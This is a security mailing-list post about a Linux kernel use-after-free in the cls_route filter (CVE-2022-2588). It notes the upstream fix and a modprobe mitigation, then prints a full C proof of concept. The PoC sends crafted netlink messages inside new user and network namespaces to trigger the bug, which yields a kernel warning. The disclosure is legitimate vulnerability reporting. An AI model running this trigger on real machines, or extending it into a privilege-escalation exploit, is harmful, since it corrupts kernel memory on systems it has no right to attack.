Received: (qmail 9967 invoked by uid 550); 18 Aug 2022 07:26:09 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 14195 invoked from network); 17 Aug 2022 20:28:13 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=canonical.com;
	s=20210705; t=1660768081;
	bh=ZbEnGdSEI7BoKJKGI7vgKTPckM+nDffFC1/fWAz6tdU=;
	h=Date:From:To:Subject:Message-ID:References:MIME-Version:
	 Content-Type:In-Reply-To;
	b=V/MzhL7ILbDeSKjBW0GyKP1Wp1VEYTZk15Pf7/OPRxjNoM0PEFdfUKW0L4FVT/agM
	 /JmOEHC1RtMGeRJvTEZPLPNLyKq06Gjb9zLnWHBmz5tXz++bYcH2qSUUIomPtyz86v
	 N+5x0QiVxuCPdoL4iRYOvPeLQQdMrG761aaS3epC5kq3pRDA9DxNUQJnNvmCthOgsY
	 ITAp/au3HbDe6MaVKh+QN5e1zWotfwohb4Nw++ZWDzr01Ym3Db4/f3FfYy6vqAfOUM
	 N64MQxIZ80Sjp1+KNqQYCcDjHP3rVI75ydzvrylRzsshh+eacV3+ReKutrWraUBbI/
	 FusLOxaFQQlaw==
Date: Wed, 17 Aug 2022 17:27:57 -0300
From: Thadeu Lima de Souza Cascardo <cascardo@canonical.com>
To: oss-security@lists.openwall.com
Message-ID: <Yv1PTZIJ4qtA2ndU@quatroqueijos>
References: <YvKVWuPyQ/YXBT+o@quatroqueijos>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <YvKVWuPyQ/YXBT+o@quatroqueijos>
Subject: Re: [oss-security] CVE-2022-2588 - Linux kernel cls_route UAF

On Tue, Aug 09, 2022 at 02:11:54PM -0300, Thadeu Lima de Souza Cascardo wrote:
> CVE-2022-2588 - Linux kernel cls_route UAF
> 
> It was discovered that the cls_route filter implementation in the Linux kernel
> would not remove an old filter from the hashtable before freeing it if its
> handle had the value 0.
> 
> Zhenpeng Lin working with Trend Micro's Zero Day Initiative discovered that
> this vulnerability could be exploited for Local Privilege Escalation. This has
> been reported as ZDI-CAN-17440, and assigned CVE-2022-2588.
> 
> This bug has been present since the first Linux commit git, v2.6.12-rc2.
> 
> Exploiting it requires CAP_NET_ADMIN in any user or network namespace.
> 
> It can be mitigated by those users who do not rely on cls_route, by adding
> 'install cls_route /bin/true' to their modprobe.conf or modprobe.d configs,
> in case it's built as a module.
> 
> A PoC that will trigger a WARNING is going to be posted in a week.
> 
> Fixes have been sent to netdev@vger.kernel.org and are at
> https://lore.kernel.org/netdev/20220809170518.164662-1-cascardo@canonical.com/T/#u.

This has been merged as commit 9ad36309e2719a884f946678e0296be10f0bb4c1.

And here is the PoC.


#define _GNU_SOURCE
#include <sched.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/wait.h>
#include <stdlib.h>
#include <string.h>
#include <linux/pkt_sched.h>

#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <stdlib.h>


static char newlink[] = {
	/* len */
	56, 0x00, 0x00, 0x00,
	/* type = NEWLINK */
	16, 0x00,
	/* flags = NLM_F_REQUEST | NLM_F_CREATE */
	0x01, 0x04,
	/* seq */
	0x01, 0x00, 0x00, 0x00,
	/* pid */
	0x00, 0x00, 0x00, 0x00,
	/* ifi_family */
	0x00, 0x00, 0x00, 0x00,
	/* ifi_ifindex */
	0x30, 0x00, 0x00, 0x00,
	/* ifi_flags */
	0x00, 0x00, 0x00, 0x00,
	/* ifi_change */
	0x00, 0x00, 0x00, 0x00,
	/* nla_len, nla_type */
	0x08, 0x00, 0x03, 0x00,
	/* string */
	'e', 't', '2', 0,
	/* nla_len, nla_type */
	16, 0x00, 18, 0x00,
	/* nested nla_len, nla_type */
	10, 0x00, 0x01, 0x00,
	'd', 'u', 'm', 'm',
	'y', 0x00, 0x00, 0x00,
};

static char dellink[] = {
	/* len */
	40, 0x00, 0x00, 0x00,
	/* type = DELLINK */
	17, 0x00,
	/* flags = NLM_F_REQUEST | NLM_F_CREATE */
	0x01, 0x04,
	/* seq */
	0x01, 0x00, 0x00, 0x00,
	/* pid */
	0x00, 0x00, 0x00, 0x00,
	/* ifi_family */
	0x00, 0x00, 0x00, 0x00,
	/* ifi_ifindex */
	0x00, 0x00, 0x00, 0x00,
	/* ifi_flags */
	0x00, 0x00, 0x00, 0x00,
	/* ifi_change */
	0x00, 0x00, 0x00, 0x00,
	/* nla_len, nla_type */
	0x08, 0x00, 0x03, 0x00,
	/* string */
	'e', 't', '2', 0,
};

static char tfilter[] = {
	/* len */
	68, 0x00, 0x00, 0x00,
	/* type = NEWTFILTER */
	44, 0x00,
	/* flags = NLM_F_REQUEST | NLM_F_CREATE */
	0x41, 0x04,
	/* seq */
	0x01, 0x00, 0x00, 0x00,
	/* pid */
	0x00, 0x00, 0x00, 0x00,
	/* tcm_family */
	0x00, 0x00, 0x00, 0x00,
	/* tcm_ifindex */
	0x30, 0x00, 0x00, 0x00,
	/* tcm_handle */
	0x00, 0x00, 0x00, 0x00,
	/* tcm_parent */
	0x00, 0x00, 0x01, 0x00,
	/* tcm_info = protocol/prio */
	0x01, 0x00, 0x01, 0x00,
	/* nla_len, nla_type */
	0x0a, 0x00, 0x01, 0x00,
	/* string */
	'r', 'o', 'u', 't',
	'e', 0, 0, 0,
	/* OPTIONS */
	0x14, 0x00, 0x02, 0x00,
	/* ROUTE4_TO */
	0x08, 0x00, 0x02, 0x00,
	0x00, 0x00, 0x00, 0x00,
	/* ROUTE4_FROM */
	0x08, 0x00, 0x03, 0x00,
	0x00, 0x00, 0x00, 0x00,
};

static char ntfilter[] = {
	/* len */
	56, 0x00, 0x00, 0x00,
	/* type = NEWTFILTER */
	44, 0x00,
	/* flags = NLM_F_REQUEST | NLM_F_CREATE */
	/* 0x200 = NLM_F_EXCL */
	0x41, 0x04,
	/* seq */
	0x01, 0x00, 0x00, 0x00,
	/* pid */
	0x00, 0x00, 0x00, 0x00,
	/* tcm_family */
	0x00, 0x00, 0x00, 0x00,
	/* tcm_ifindex */
	0x30, 0x00, 0x00, 0x00,
	/* tcm_handle */
	0x00, 0x00, 0x00, 0x00,
	/* tcm_parent */
	0x00, 0x00, 0x01, 0x00,
	/* tcm_info = protocol/prio */
	0x01, 0x00, 0x01, 0x00,
	/* OPTIONS */
	0x14, 0x00, 0x02, 0x00,
	/* ROUTE4_TO */
	0x08, 0x00, 0x02, 0x00,
	0x01, 0x00, 0x00, 0x00,
	/* ROUTE4_FROM */
	0x08, 0x00, 0x03, 0x00,
	0x00, 0x00, 0x00, 0x00,
};


static char linkcmd[] = {
	/* len */
	44, 0x00, 0x00, 0x00,
	/* type = NEWQDISC */
	36, 0x00,
	/* flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_REPLACE */
	0x01, 0x05,
	/* seq */
	0x01, 0x00, 0x00, 0x00,
	/* pid */
	0x00, 0x00, 0x00, 0x00,
	/* tcm_family */
	0x00, 0x00, 0x00, 0x00,
	/* tcm_ifindex */
	0x30, 0x00, 0x00, 0x00,
	/* tcm_handle */
	0x00, 0x00, 0x01, 0x00,
	/* tcm_parent */
	0xff, 0xff, 0xff, 0xff,
	/* tcm_info = protocol/prio */
	0x00, 0x00, 0x00, 0x00,
	/* nla_len, nla_type */
	0x04, 0x00, 0x01, 0x00,
	/* string */
};

int build_qfq(char *buf)
{
	char *qopt;
	short *tlen;
	char *qdisc = "qfq";

	short *optlen;
	short *opttype;

	tlen = buf;

	memset(buf, 0, sizeof(buf));
	memcpy(buf, linkcmd, sizeof(linkcmd));
	strcpy(buf+sizeof(linkcmd), qdisc);
	*tlen = sizeof(linkcmd) + strlen(qdisc) + 1;
	buf[36] = strlen(qdisc)+5;

	qopt = buf + *tlen;
	/* nla_len, nla_type */
	/* 24, 0x00, 0x02, 0x00, */
	optlen = qopt;
	opttype = optlen + 1;
	*opttype = 0x2;

	*optlen = 4;

	*tlen += *optlen;

	return *tlen;
}

int main(int argc, char **argv)
{
	int s;
	pid_t p;
	int *error;
	char buf[4096];
	int tlen;
	error = (int *) (buf + 16);

	unsigned long count = 1;
	int i;

	unshare(CLONE_NEWUSER|CLONE_NEWNET);
	tlen = build_qfq(buf);

	s = socket(AF_NETLINK, SOCK_RAW|SOCK_NONBLOCK, NETLINK_ROUTE);
	write(s, newlink, sizeof(newlink));
	read(s, buf, sizeof(buf));
	printf("%d\n", *error);

	write(s, buf, tlen);
	read(s, buf, sizeof(buf));
	printf("%d\n", *error);

	write(s, tfilter, sizeof(tfilter));
	read(s, buf, sizeof(buf));
	printf("%d\n", *error);

	write(s, ntfilter, sizeof(ntfilter));
	read(s, buf, sizeof(buf));
	printf("%d\n", *error);

	write(s, dellink, sizeof(dellink));
	read(s, buf, sizeof(buf));
	printf("%d\n", *error);


	return 0;
}
